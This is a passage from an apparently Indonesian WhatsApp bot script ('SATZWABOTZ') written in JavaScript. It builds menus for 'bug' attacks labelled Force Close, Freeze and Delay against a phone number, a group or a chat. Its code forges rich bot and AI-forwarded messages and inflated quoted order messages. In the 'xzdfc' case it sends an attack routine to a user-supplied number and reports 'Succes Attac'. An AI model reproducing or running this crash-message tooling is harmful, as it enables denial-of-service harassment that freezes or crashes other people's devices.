        padding: 15,
        __typename: "GenAILatexItem"
      }
    }
  ];

  const id1 = ".menu";
  const id2 = ".menu";

  // =========================
  // SECTIONS
  // =========================

  const sections = [

    // TEXT
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIMarkdownTextUXPrimitive",
          text: "# SATZWABOTZ"
        }
      }
    },

    // IMAGE DI ATAS TITLE
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIImagePrimitive",

          preview_image: {
            __typename: "GenAIMediaItem",
            mime_type: "image/jpeg",
            url: "https://files.catbox.moe/ld1a18.jpg"
          },

          full_image: {
            __typename: "GenAIMediaItem",
            mime_type: "image/jpeg",
            url: "https://files.catbox.moe/ld1a18.jpg"
          }
        }
      }
    },

    // WIDGET + TITLE
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAIHScrollLayoutViewModel",
        primitives: [

          {
            __typename: "GenAI3PExtWidgetPrimitive",

            header: {
              __typename: "GenAI3PExtWidgetStandardHeader",

              title: `
┏━━━〔 BUG NUMBER 〕━━━⬣
┃
┃ .xzdfc ( Force Close Invisible )
┃ .xzdfre ( Freeze Invisible )
┃ .adadas ( Delay Invisible )
┃
┗━━━━━━━━━━━━━━⬣`
            },

            body: {
              __typename: "GenAI3PExtCalendarEventList",

              sections: [],

              ctas: [

                {
                  label: "BUG PLACE",
                  state: "PENDING",
                  kind: "OTHER",
                  tool_call_id: "place",

                  toast: {
                    label: "Opening Telegram...",
                    __typename: "GenAI3PExtWidgetToast"
                  },

                  __typename: "GenAI3PExtWidgetCTA"
                },

                {
                  label: "BUG GROUP",
                  state: "PENDING",
                  kind: "OTHER",
                  tool_call_id: "group",

                  toast: {
                    label: "Opening WhatsApp Channel...",
                    __typename: "GenAI3PExtWidgetToast"
                  },

                  __typename: "GenAI3PExtWidgetCTA"
                }

              ]
            }
          }

        ]
      }
    },

    // ACTION ROW + LATEX
    {
      __typename: "GenAIUnifiedResponseSection",

      view_model: {
        __typename: "GenAIActionRowLayoutViewModel",

        primitives: [

          {
            cta_text: "Telegram",
            cta_type: "OPEN_URL",
            cta_url: "https://t.me/mynamesatzera",
            cta_color: "#2196F3",
            __typename: "GenAIFooterActionPrimitive"
          },

          {
            text: text2,
            inline_entities: inline_entities_2,
            __typename: "GenAIMarkdownTextUXPrimitive"
          }

        ]
      }
    }

  ];

  // =========================
  // AI JID
  // =========================

  const server = [
    "@s.whatsapp.net",
    "@lid",
    "@broadcast",
    "@bot",
    "@g.us"
  ];

  const aiJid =
    "13135550002" + server[0];

  // =========================
  // MESSAGE
  // =========================

  const msg = {

    botForwardedMessage: {

      message: {

        richResponseMessage: {

          messageType: 2,

          submessages: [

            {
              messageType: 2,
              messageText: text2
            },

          ],

          unifiedResponse: {

            data: Buffer.from(
              JSON.stringify({
                response_id,
                sections
              })
            ).toString("base64")

          },

          contextInfo: {

            isForwarded: true,
            forwardOrigin: 4,

            participant: aiJid,

            remoteJid: "status@broadcast",

            quotedMessage: {

              protocolMessage: {
                type: 25
              }

            }

          }

        }

      }

    }

  };

  // =========================
  // SEND
  // =========================

  await conn.relayMessage(
    m.chat,
    msg,
    {}
  );

break;
                   }
                   
                   

///// BUG PLACE

case "place": {
const crypto = require("crypto");
  const response_id = crypto.randomUUID();

  // =========================
  // LATEX
  // =========================

  const rvnz2 =
    "https://files.catbox.moe/ld1a18.jpg?v=" + Date.now();

  const text2 =
    "{{Rvnz2}}Revinza{{/Rvnz2}}\n";

  const inline_entities_2 = [
    {
      key: "Rvnz2",
      metadata: {
        latex_expression: "Revinza",
        latex_image: {
          url: rvnz2,
          width: 400,
          height: 400
        },
        font_height: 83.333,
        padding: 15,
        __typename: "GenAILatexItem"
      }
    }
  ];

  const id1 = ".menu";
  const id2 = ".menu";

  // =========================
  // SECTIONS
  // =========================

  const sections = [

    // TEXT
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIMarkdownTextUXPrimitive",
          text: "# SATZWABOTZ"
        }
      }
    },

    // IMAGE DI ATAS TITLE
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIImagePrimitive",

          preview_image: {
            __typename: "GenAIMediaItem",
            mime_type: "image/jpeg",
            url: "https://files.catbox.moe/ld1a18.jpg"
          },

          full_image: {
            __typename: "GenAIMediaItem",
            mime_type: "image/jpeg",
            url: "https://files.catbox.moe/ld1a18.jpg"
          }
        }
      }
    },

    // WIDGET + TITLE
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAIHScrollLayoutViewModel",
        primitives: [

          {
            __typename: "GenAI3PExtWidgetPrimitive",

            header: {
              __typename: "GenAI3PExtWidgetStandardHeader",

              title: `
┏━━━〔 BUG IN PLACE 〕━━━⬣
┃
┃ .x ( Force Close Invisible )
┃ .show ( Freeze Invisible )
┃ .clik ( Delay Invisible )
┃
┗━━━━━━━━━━━━━━⬣`
            },

            body: {
              __typename: "GenAI3PExtCalendarEventList",

              sections: [],

              ctas: [

                {
                  label: "DEVELOPER",
                  state: "PENDING",
                  kind: "OTHER",
                  tool_call_id: "menu",

                  toast: {
                    label: "Opening Telegram...",
                    __typename: "GenAI3PExtWidgetToast"
                  },

                  __typename: "GenAI3PExtWidgetCTA"
                },

                {
                  label: "SATZBACK?",
                  state: "PENDING",
                  kind: "OTHER",
                  tool_call_id: "menu",

                  toast: {
                    label: "Opening WhatsApp Channel...",
                    __typename: "GenAI3PExtWidgetToast"
                  },

                  __typename: "GenAI3PExtWidgetCTA"
                }

              ]
            }
          }

        ]
      }
    },

    // ACTION ROW + LATEX
    {
      __typename: "GenAIUnifiedResponseSection",

      view_model: {
        __typename: "GenAIActionRowLayoutViewModel",

        primitives: [

          {
            cta_text: "Telegram",
            cta_type: "OPEN_URL",
            cta_url: "https://t.me/mynamesatzera",
            cta_color: "#2196F3",
            __typename: "GenAIFooterActionPrimitive"
          },

          {
            text: text2,
            inline_entities: inline_entities_2,
            __typename: "GenAIMarkdownTextUXPrimitive"
          }

        ]
      }
    }

  ];

  // =========================
  // AI JID
  // =========================

  const server = [
    "@s.whatsapp.net",
    "@lid",
    "@broadcast",
    "@bot",
    "@g.us"
  ];

  const aiJid =
    "13135550002" + server[0];

  // =========================
  // MESSAGE
  // =========================

  const msg = {

    botForwardedMessage: {

      message: {

        richResponseMessage: {

          messageType: 2,

          submessages: [

            {
              messageType: 2,
              messageText: text2
            },

          ],

          unifiedResponse: {

            data: Buffer.from(
              JSON.stringify({
                response_id,
                sections
              })
            ).toString("base64")

          },

          contextInfo: {

            isForwarded: true,
            forwardOrigin: 4,

            quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          stanzaId: crypto.randomBytes(8).toString("hex")
          }

        }

      }

    }

  };

  // =========================
  // SEND
  // =========================

  await conn.relayMessage(
    m.chat,
    msg,
    {}
  );
  }
  break;
  
  ////// GROUP
  
  case "group": {
  const crypto = require("crypto");
  const response_id = crypto.randomUUID();

  // =========================
  // LATEX
  // =========================

  const rvnz2 =
    "https://files.catbox.moe/ld1a18.jpg?v=" + Date.now();

  const text2 =
    "{{Rvnz2}}Revinza{{/Rvnz2}}\n";

  const inline_entities_2 = [
    {
      key: "Rvnz2",
      metadata: {
        latex_expression: "Revinza",
        latex_image: {
          url: rvnz2,
          width: 400,
          height: 400
        },
        font_height: 83.333,
        padding: 15,
        __typename: "GenAILatexItem"
      }
    }
  ];

  const id1 = ".menu";
  const id2 = ".menu";

  // =========================
  // SECTIONS
  // =========================

  const sections = [

    // TEXT
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIMarkdownTextUXPrimitive",
          text: "# SATZWABOTZ"
        }
      }
    },

    // IMAGE DI ATAS TITLE
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIImagePrimitive",

          preview_image: {
            __typename: "GenAIMediaItem",
            mime_type: "image/jpeg",
            url: "https://files.catbox.moe/ld1a18.jpg"
          },

          full_image: {
            __typename: "GenAIMediaItem",
            mime_type: "image/jpeg",
            url: "https://files.catbox.moe/ld1a18.jpg"
          }
        }
      }
    },

    // WIDGET + TITLE
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAIHScrollLayoutViewModel",
        primitives: [

          {
            __typename: "GenAI3PExtWidgetPrimitive",

            header: {
              __typename: "GenAI3PExtWidgetStandardHeader",

              title: `
┏━━━〔 BUG IN GROUP 〕━━━⬣
┃
┃ .xzdgb ( Force Close Invisible )
┃ .xzdgbf ( Freeze Invisible )
┃ .clik ( Delay Invisible )
┃
┗━━━━━━━━━━━━━━⬣`
            },

            body: {
              __typename: "GenAI3PExtCalendarEventList",

              sections: [],

              ctas: [

                {
                  label: "BUG PLACE",
                  state: "PENDING",
                  kind: "OTHER",
                  tool_call_id: "place",

                  toast: {
                    label: "Opening Telegram...",
                    __typename: "GenAI3PExtWidgetToast"
                  },

                  __typename: "GenAI3PExtWidgetCTA"
                },

                {
                  label: "BUG NUMBER",
                  state: "PENDING",
                  kind: "OTHER",
                  tool_call_id: "bugnum",

                  toast: {
                    label: "Opening WhatsApp Channel...",
                    __typename: "GenAI3PExtWidgetToast"
                  },

                  __typename: "GenAI3PExtWidgetCTA"
                }

              ]
            }
          }

        ]
      }
    },

    // ACTION ROW + LATEX
    {
      __typename: "GenAIUnifiedResponseSection",

      view_model: {
        __typename: "GenAIActionRowLayoutViewModel",

        primitives: [

          {
            cta_text: "Telegram",
            cta_type: "OPEN_URL",
            cta_url: "https://t.me/mynamesatzera",
            cta_color: "#2196F3",
            __typename: "GenAIFooterActionPrimitive"
          },

          {
            text: text2,
            inline_entities: inline_entities_2,
            __typename: "GenAIMarkdownTextUXPrimitive"
          }

        ]
      }
    }

  ];

  // =========================
  // AI JID
  // =========================

  const server = [
    "@s.whatsapp.net",
    "@lid",
    "@broadcast",
    "@bot",
    "@g.us"
  ];

  const aiJid =
    "13135550002" + server[0];

  // =========================
  // MESSAGE
  // =========================

  const msg = {

    botForwardedMessage: {

      message: {

        richResponseMessage: {

          messageType: 2,

          submessages: [

            {
              messageType: 2,
              messageText: text2
            },

          ],

          unifiedResponse: {

            data: Buffer.from(
              JSON.stringify({
                response_id,
                sections
              })
            ).toString("base64")

          },

          contextInfo: {

            isForwarded: true,
            forwardOrigin: 4,

            quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          stanzaId: crypto.randomBytes(8).toString("hex")

          }

        }

      }

    }

  };

  // =========================
  // SEND
  // =========================

  await conn.relayMessage(
    m.chat,
    msg,
    {}
  );
  }
  break;
  
  
  


                
                case "addgb": {
    if (!isOwner(m))
        return reply("Khusus owner");

    if (!m.isGroup)
        return reply("Command hanya bisa digunakan di grup.");

    const metadata = await conn.groupMetadata(m.chat);
    const premiumDB = readJSON(premiumPath);

    let added = 0;
    let already = 0;

    for (const member of metadata.participants) {
        const num = getNumber(member.id);

        if (!num) continue;

        if (premiumDB.includes(num)) {
            already++;
            continue;
        }

        premiumDB.push(num);
        added++;
    }

    saveJSON(premiumPath, premiumDB);

    reply(
        `✅ Add Premium Group Berhasil\n\n` +
        `📛 Grup : ${metadata.subject}\n` +
        `👥 Member : ${metadata.participants.length}\n` +
        `➕ Ditambahkan : ${added}\n` +
        `♻️ Sudah Premium : ${already}`
    );
}
break;
               case "tqto": {
    try {
        const kontributorTable = [
            ["Role", "Nama Team"],
            ["Developer Utama", "Satz"],
            ["Team Support", "All Team XzD"]
        ];

        const rawMeta = `
const Project = {
    "Project": "XzD Bot",
    "Lead": "Satz",
    "Team": "XzD",
    "Status": "Development Active"
};

console.log(Project);
        `.trim();

        const textBody = `# ThankTo & Support Team

Terima kasih yang sebesar-besarnya kepada seluruh team dan kreator yang telah ikut serta membantu membangun Team bot ini.

✨ **Hubungi Tim Kami (Direct Link):**
• 👑 [Satz (Developer)](https://t.me/MynameSatzEra)
• 👤 [Levvleys (Support)](https://t.me/lepicode)`;

        await conn.sendMessage(
            m.chat,
            {
                richMessage: {
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        mentionedJid: [m.sender],
                        isForwarded: true,

                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363330344810280@newsletter",
                            serverMessageId: 0,
                            newsletterName: "</> 𝐏𝐡𝐨𝐧𝐢𝐱 - SATZ </>"
                        }
                    },

                    title: "☄️ SPECIAL THANKS TO ☄️",

                    text: textBody,

                    productMultiple: [
                        {
                            title: "Developer",
                            brand: "Satz",
                            price: "Rp12.000",
                            product_url: "https://t.me/mynamesatzera",
                            image: "https://files.catbox.moe/ld1a18.jpg"
                        },
                        {
                            title: "Base",
                            brand: "Levvleys",
                            price: "Rp5.000",
                            product_url: "https://levvicode.cloud",
                            image: "https://files.catbox.moe/wcosm8.jpg"
                        }
                    ],

                    table: kontributorTable,

                    code: {
                        language: "javascript",
                        code: rawMeta
                    },

                    tip: `💡 Tips:
Untuk respon instan, silakan klik daftar nama bergaris bawah pada teks pesan di atas!`
                }
            },
            {}
        );

    } catch (e) {
        console.error("TQTO ERROR:", e);
        reply("❌ Terjadi kesalahan saat memproses data richMessage.");
    }
}
break;
                
           case "ownermenu": {
               await conn.relayMessage(m.chat,{
        botForwardedMessage: {
        message: {
        richResponseMessage: {
        messageType: 1,
        submessages: [
            {
              messageType: 2,
              messageText: "🎸 NOX GUITAR HERO"
            }
          ],
          unifiedResponse: {
            data: Buffer.from(
              JSON.stringify({
                response_id: "nox-guitar-hero-" + Date.now(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Owner Command</title>

<style>

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body {
    background: #0a0a0f;
    padding: 18px;
    color: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}

/* =========================
   LOADING SCREEN
========================= */

.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #0a0a0f;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    transition: opacity 0.8s ease, visibility 0.8s ease;
}

.loading-overlay.hidden {
    opacity: 0;
    visibility: hidden;
}

.loading-spinner {
    width: 70px;
    height: 70px;
    border: 4px solid #1a0a2e;
    border-top: 4px solid #b44cff;
    border-radius: 50%;
    animation: spin 0.9s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
    box-shadow: 0 0 40px rgba(180, 76, 255, 0.3);
}

.loading-text {
    margin-top: 25px;
    color: #b44cff;
    font-size: 16px;
    font-weight: 600;
    letter-spacing: 2px;
    animation: pulse 1.5s ease-in-out infinite;
    text-shadow: 0 0 20px rgba(180, 76, 255, 0.3);
}

.loading-dots {
    display: inline-flex;
    gap: 6px;
    margin-top: 10px;
}

.loading-dots span {
    width: 10px;
    height: 10px;
    background: #b44cff;
    border-radius: 50%;
    animation: bounce 1.4s ease-in-out infinite;
    box-shadow: 0 0 10px rgba(180, 76, 255, 0.5);
}

.loading-dots span:nth-child(1) { animation-delay: 0s; }
.loading-dots span:nth-child(2) { animation-delay: 0.2s; }
.loading-dots span:nth-child(3) { animation-delay: 0.4s; }

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

@keyframes pulse {
    0%, 100% { opacity: 0.6; }
    50% { opacity: 1; }
}

@keyframes bounce {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
    40% { transform: scale(1); opacity: 1; }
}

/* =========================
   CONTAINER
========================= */

.container {
    width: 100%;
    max-width: 620px;
    min-height: 600px;
    margin: auto;
    padding: 28px 24px;
    background: linear-gradient(145deg, #12082a 0%, #0a0518 100%);
    border: 2px solid #6a1fb1;
    border-radius: 30px;
    box-shadow: 0 0 40px rgba(180, 76, 255, 0.15), inset 0 0 60px rgba(180, 76, 255, 0.03);
    opacity: 0;
    transform: translateY(30px) scale(0.97);
    animation: fadeInUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 1.2s forwards;
}

@keyframes fadeInUp {
    to {
        opacity: 1;
        transform: translateY(0) scale(1);
    }
}

/* =========================
   HEADER
========================= */

.header {
    display: flex;
    align-items: center;
    gap: 15px;
    padding-bottom: 20px;
    border-bottom: 1px solid #3a1a5e;
}

.header-icon {
    width: 56px;
    height: 56px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 17px;
    font-size: 28px;
    background: linear-gradient(145deg, #7a2bc7, #4a1a7a);
    border: 1px solid #b44cff;
    box-shadow: 0 0 25px rgba(180, 76, 255, 0.3);
    animation: glowPulse 2s ease-in-out infinite;
}

@keyframes glowPulse {
    0%, 100% { box-shadow: 0 0 25px rgba(180, 76, 255, 0.3); }
    50% { box-shadow: 0 0 50px rgba(180, 76, 255, 0.5); }
}

.header-text {
    flex: 1;
}

.header-text h1 {
    color: #c77dff;
    font-size: 28px;
    font-weight: 700;
    letter-spacing: .3px;
    text-shadow: 0 0 20px rgba(180, 76, 255, 0.2);
}

.header-text .sub {
    color: #8a6aae;
    font-size: 14px;
    margin-top: 5px;
}

.badge-owner {
    padding: 9px 17px;
    border-radius: 22px;
    background: #2a0a4a;
    border: 1px solid #9a3adf;
    color: #c77dff;
    font-size: 12px;
    font-weight: bold;
    box-shadow: 0 0 20px rgba(180, 76, 255, 0.15);
}

/* =========================
   COMMAND GRID
========================= */

.command-wrapper {
    margin-top: 22px;
    max-height: 680px;
    overflow-y: auto;
    padding-right: 7px;
}

.command-wrapper::-webkit-scrollbar {
    width: 7px;
}

.command-wrapper::-webkit-scrollbar-track {
    background: #0a0518;
    border-radius: 10px;
}

.command-wrapper::-webkit-scrollbar-thumb {
    background: #6a1fb1;
    border-radius: 10px;
}

.command-grid {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 12px;
}

.command-item {
    min-height: 100px;
    padding: 18px 17px;
    background: linear-gradient(145deg, #15082a, #0d0518);
    border: 1px solid #3a1a5e;
    border-radius: 15px;
    transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
    cursor: default;
    opacity: 0;
    animation: itemAppear 0.5s ease forwards;
}

.command-item:nth-child(1) { animation-delay: 1.3s; }
.command-item:nth-child(2) { animation-delay: 1.35s; }
.command-item:nth-child(3) { animation-delay: 1.4s; }
.command-item:nth-child(4) { animation-delay: 1.45s; }
.command-item:nth-child(5) { animation-delay: 1.5s; }
.command-item:nth-child(6) { animation-delay: 1.55s; }
.command-item:nth-child(7) { animation-delay: 1.6s; }
.command-item:nth-child(8) { animation-delay: 1.65s; }
.command-item:nth-child(9) { animation-delay: 1.7s; }
.command-item:nth-child(10) { animation-delay: 1.75s; }

@keyframes itemAppear {
    from {
        opacity: 0;
        transform: translateY(20px) scale(0.95);
    }
    to {
        opacity: 1;
        transform: translateY(0) scale(1);
    }
}

.command-item:hover {
    border-color: #b44cff;
    transform: translateY(-3px) scale(1.03);
    box-shadow: 0 8px 30px rgba(180, 76, 255, 0.15);
    background: linear-gradient(145deg, #1a0a35, #100520);
}

.cmd-name {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    color: #dbb3ff;
    font-size: 16px;
    font-weight: bold;
}

.tag {
    padding: 5px 12px;
    border-radius: 20px;
    background: linear-gradient(145deg, #3a1a5e, #1a0a35);
    border: 1px solid #6a2abf;
    color: #c77dff;
    font-size: 8px;
    font-weight: bold;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    box-shadow: 0 0 10px rgba(180, 76, 255, 0.1);
}

.tag-owner {
    border-color: #b44cff;
    background: linear-gradient(145deg, #4a1a7a, #2a0a4a);
    color: #e88aff;
}

.tag-prem {
    border-color: #ff6b9d;
    background: linear-gradient(145deg, #4a1a3a, #2a0a2a);
    color: #ff8fbf;
}

.tag-gb {
    border-color: #6bb4ff;
    background: linear-gradient(145deg, #1a2a4a, #0a1a2a);
    color: #8fcfff;
}

.cmd-desc {
    color: #8a6aae;
    font-size: 11px;
    line-height: 1.6;
    margin-top: 10px;
}

/* =========================
   DIVIDER
========================= */

.divider {
    width: 100%;
    height: 3px;
    margin-top: 20px;
    border-radius: 10px;
    background: linear-gradient(90deg, #6a1fb1, #b44cff, #e88aff, #b44cff, #6a1fb1);
    box-shadow: 0 0 20px rgba(180, 76, 255, 0.2);
    animation: gradientMove 3s ease-in-out infinite;
    background-size: 200% 100%;
}

@keyframes gradientMove {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
}

/* =========================
   FOOTER
========================= */

.footer-note {
    margin-top: 20px;
    padding-top: 17px;
    border-top: 1px solid #2a1a4a;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
    color: #6a4a8a;
    font-size: 13px;
    flex-wrap: wrap;
}

.status-dot {
    width: 9px;
    height: 9px;
    border-radius: 50%;
    background: #b44cff;
    box-shadow: 0 0 15px rgba(180, 76, 255, 0.5);
    animation: dotPulse 1.5s ease-in-out infinite;
}

@keyframes dotPulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(0.8); }
}

.footer-highlight {
    color: #c77dff;
    font-weight: bold;
    text-shadow: 0 0 10px rgba(180, 76, 255, 0.2);
}

/* =========================
   MOBILE
========================= */

@media(max-width: 500px) {
    body {
        padding: 8px;
    }

    .container {
        max-width: 100%;
        min-height: 500px;
        padding: 20px 15px;
        border-radius: 24px;
    }

    .header-icon {
        width: 48px;
        height: 48px;
        font-size: 23px;
    }

    .header-text h1 {
        font-size: 21px;
    }

    .header-text .sub {
        font-size: 12px;
    }

    .badge-owner {
        padding: 7px 10px;
        font-size: 9px;
    }

    .command-grid {
        gap: 9px;
    }

    .command-item {
        min-height: 85px;
        padding: 14px 12px;
    }

    .cmd-name {
        font-size: 14px;
    }

    .cmd-desc {
        font-size: 10px;
    }

    .tag {
        padding: 4px 8px;
        font-size: 7px;
    }

    .loading-spinner {
        width: 50px;
        height: 50px;
    }

    .loading-text {
        font-size: 14px;
    }
}

</style>
</head>

<body>

<!-- LOADING OVERLAY -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
    <div class="loading-text">LOADING</div>
    <div class="loading-dots">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="container">

    <!-- HEADER -->
    <div class="header">
        <div class="header-icon">⚡</div>
        <div class="header-text">
            <h1>Owner Command</h1>
            <div class="sub">Privileged · Administrator</div>
        </div>
        <div class="badge-owner">🔒 OWNER</div>
    </div>

    <!-- COMMAND LIST -->
    <div class="command-wrapper">
        <div class="command-grid">
            <div class="command-item">
                <div class="cmd-name">
                    self
                    <span class="tag tag-owner">OWNER</span>
                </div>
                <div class="cmd-desc">
                    Mengaktifkan mode private bot.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    public
                    <span class="tag tag-owner">OWNER</span>
                </div>
                <div class="cmd-desc">
                    Mengaktifkan mode public bot.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    crm
                    <span class="tag tag-owner">OWNER</span>
                </div>
                <div class="cmd-desc">
                    Mengelola resource internal bot.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    eval
                    <span class="tag tag-owner">OWNER</span>
                </div>
                <div class="cmd-desc">
                    Mengeksekusi kode JavaScript secara langsung.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    addprem
                    <span class="tag tag-prem">PREMIUM</span>
                </div>
                <div class="cmd-desc">
                    Menambahkan user ke daftar premium.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    delprem
                    <span class="tag tag-prem">PREMIUM</span>
                </div>
                <div class="cmd-desc">
                    Menghapus user dari daftar premium.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    addowner
                    <span class="tag tag-owner">OWNER</span>
                </div>
                <div class="cmd-desc">
                    Menambahkan user sebagai owner bot.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    delowner
                    <span class="tag tag-owner">OWNER</span>
                </div>
                <div class="cmd-desc">
                    Menghapus user dari daftar owner.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    addgb
                    <span class="tag tag-gb">GROUP</span>
                </div>
                <div class="cmd-desc">
                    Menambahkan grup ke daftar grup bot.
                </div>
            </div>

            <div class="command-item">
                <div class="cmd-name">
                    delgb
                    <span class="tag tag-gb">GROUP</span>
                </div>
                <div class="cmd-desc">
                    Menghapus grup dari daftar grup bot.
                </div>
            </div>
        </div>
    </div>

    <!-- DIVIDER -->
    <div class="divider"></div>

    <!-- FOOTER -->
    <div class="footer-note">
        <span class="status-dot"></span>
        <span>
            <span class="footer-highlight">10</span>
            command tersedia
        </span>
        <span>·</span>
        <span>
            khusus
            <span class="footer-highlight">Owner</span>
        </span>
    </div>

</div>

<script>
    // Hilangkan loading setelah 1.2 detik
    setTimeout(() => {
        document.getElementById('loadingOverlay').classList.add('hidden');
    }, 1200);
</script>

</body>
</html>`,
        trusted_sources: [global?.ownername || "Noxm007 Official"]
                      },
                      __typename: "GenAISingleLayoutViewModel"
                    }
                  }
                ]
              })
            ).toString("base64")
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {}
)
               }
                break;

                                        
                                        
                                        
                                        
                                        
                                        

/// CASE BUG NUMBER
case "xzdfc": {
  if (!isPremium && !isCreator)
    return m.reply(msg.premium);

  const phone = args[0]
    ? args[0].replace(/[^0-9]/g, "")
    : null;

  if (!phone)
    return await conn.sendMessage(m.chat,{
        richMessage: {
        title: "Error!!",
        code: {
        language: "javascript",
        code: ""
        },
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
            suggestions: [
                "contoh =>",
                "invis 62887887",
                ]
    }
        })

  const target = phone + "@s.whatsapp.net";

  // =========================================
  // MESSAGE 1
  // =========================================

  await conn.sendMessage(m.chat,{
      richMessage: {
        title: "Satz Succes Attac",
        table: [
        ["Type", "Nomor", "Status"],
        ["Force Close",target,"Processing"]
        ],
        code: {
        language: "javascript",
        code: ` const status = {
        "Status": "Processing Sending",
        "Target": ${target}
        }`
        },
        
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
        contextInfo: {
        quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "Wabotz ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
        }
    });
    

  // =========================================
  // SIMULASI PROSES
  // =========================================

  let startTime = Date.now();

  for (let i = 0; i < 1; i++) {
await satz(conn,target);
}
                let endTime = Date.now();
  let elapsedTime =
    ((endTime - startTime) / 1000).toFixed(2);

  console.log(`Process selesai dalam ${elapsedTime}s`);
    // =======================================
    // MESSAGE 2
    // =======================================

    await conn.sendMessage(
      m.chat,
      {
        richMessage: {
        title: "Satz Succes Attac",
        table: [
        ["Type", "Nomor", "Status"],
        ["Force Close", target, "Succes"]
        ],
        code: {
        language: "javascript",
        code: ` const status = {
        "Status": "Succes",
        "Target": ${target}
        }`
        },
        
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
        contextInfo: {
        quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
